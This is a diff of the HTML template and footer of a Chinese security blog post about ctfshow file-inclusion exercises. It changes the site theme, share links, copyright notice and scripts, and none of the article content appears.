-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&text=web入门文件包含篇-ctfshow"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&is_video=false&description=web入门文件包含篇-ctfshow"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=web入门文件包含篇-ctfshow&body=Check out this article: https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&name=web入门文件包含篇-ctfshow&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&t=web入门文件包含篇-ctfshow"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
 </div>
 
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/" title="web入门文件包含篇-ctfshow">https://wanth3f1ag.top/2024/12/03/web入门文件包含篇-ctfshow/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
+          </div>
+
         
-        
-<footer id="footer">
-    <div class="footer-left">
-        Copyright ©
-        
-        
-        2024-2025
-        wanTh3flag
-        <br>
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/12/02/sqlmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E7%9A%84%E6%91%98%E5%BD%95/" rel="prev" title="sqlmap基础命令的摘录">
+                  <i class="fa fa-angle-left"></i> sqlmap基础命令的摘录
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/12/13/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="next" title="基础知识">
+                  基础知识 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">45:12</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
     </div>
-    
-    <div class="footer-right">
-        <nav>
-            <ul>
-                <!--
-                --><li><a href="/">H0me</a></li><!--
-                --><!--
-                --><li><a href="/about/">A6out</a></li><!--
-                --><!--
-                --><li><a href="/tags/">T6gs</a></li><!--
-                --><!--
-                --><li><a href="/categories/">Catagory</a></li><!--
-                --><!--
-                --><li><a href="/links/">L1nks</a></li><!--
-                --><!--
-                --><li><a href="/search/">s4arch</a></li><!--
-                -->
-            </ul>
-            <ul>
-                
-                <!-- 不蒜子统计 -->
-                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
-                <span class="post-meta-divider">|</span>
-                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
-                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-                
-            </ul>
-        </nav>
-    </div>
-</footer>
-
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
+  </footer>
 
   
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
 
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
 
 </body>
 </html>
